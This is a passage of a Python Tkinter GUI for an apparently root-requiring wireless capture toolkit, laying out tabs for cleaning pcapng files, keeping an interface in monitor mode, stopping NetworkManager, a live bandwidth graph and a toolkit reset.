Button(cl,text="Select & Clean pcapng",bg=ACCENT,fg="white",command=clean_capture).pack(pady=4)
cleaner_out=scrolledtext.ScrolledText(cl,width=115,height=20,bg="#0d0d17",fg=NEON,font=("Consolas",10)); cleaner_out.pack()

# ── Utilities tab ----------------------------------------------------------
ut=tabs["utils"]
Checkbutton(ut,text="Sticky Monitor (leave iface in mon mode)",variable=sticky_mon,bg=BGC,fg=NEON,selectcolor=BGC,activebackground=BGC).pack(anchor="w",padx=12,pady=4)
Checkbutton(ut,text="Killer (stop NetworkManager & co.)",variable=killer_enabled,command=toggle_killer,bg=BGC,fg=NEON,selectcolor=BGC,activebackground=BGC).pack(anchor="w",padx=12,pady=2)
Button(ut,text="Refresh Stats",bg=ACCENT,fg="white",command=show_stats).pack(pady=4)
Button(ut,text="Run Dependency Doctor",bg=ACCENT,fg="white",command=dependency_doctor).pack(pady=2)
utils_out=scrolledtext.ScrolledText(ut,width=115,height=12,bg="#0d0d17",fg=NEON,font=("Consolas",10)); utils_out.pack()
bwF=Frame(ut,bg=BGC); bwF.pack(pady=10,fill=X)
Label(bwF,text="Broadband iface:",bg=BGC,fg=NEON).pack(side=LEFT)
Entry(bwF,textvariable=mon_iface_var,width=12).pack(side=LEFT,padx=4)
Button(bwF,text="Start",bg=ACCENT,fg="white",command=start_bw_monitor).pack(side=LEFT,padx=4)
Button(bwF,text="Stop",bg="#ff0030",fg="white",command=stop_bw_monitor).pack(side=LEFT)
fig=Figure(figsize=(5,2.2),dpi=100,facecolor="#0d0d17"); ax=fig.add_subplot(111)
ax.set_title("kbit/s (60 s)",color=NEON,fontsize=9)
ax.tick_params(axis='x',colors="white"); ax.tick_params(axis='y',colors="white")
ln_up,=ax.plot([],[],label="Up",linewidth=1); ln_dn,=ax.plot([],[],label="Down",linewidth=1)
ax.legend(facecolor="#0d0d17",edgecolor="#0d0d17",labelcolor="white")
canvas=FigureCanvasTkAgg(fig,master=ut); canvas.get_tk_widget().pack(fill=X,padx=10)

# ── Reset tab --------------------------------------------------------------
rt=Frame(nb,bg=BGC); nb.add(rt,text="♻️ Reset")
Button(rt,text="Reset Toolkit",width=26,bg=ACCENT,fg="white",command=lambda:reset_toolkit(False)).pack(pady=12)
Button(rt,text="Reset & Exit",width=26,bg="#ff0030",fg="white",command=lambda:reset_toolkit(True)).pack()

# ─────────────────── main ─────────────────────────────────────────────────
if __name__=="__main__":
    if os.geteuid()!=0:
        messagebox.showerror("Need root","Run with sudo."); sys.exit(1)
    root.mainloop()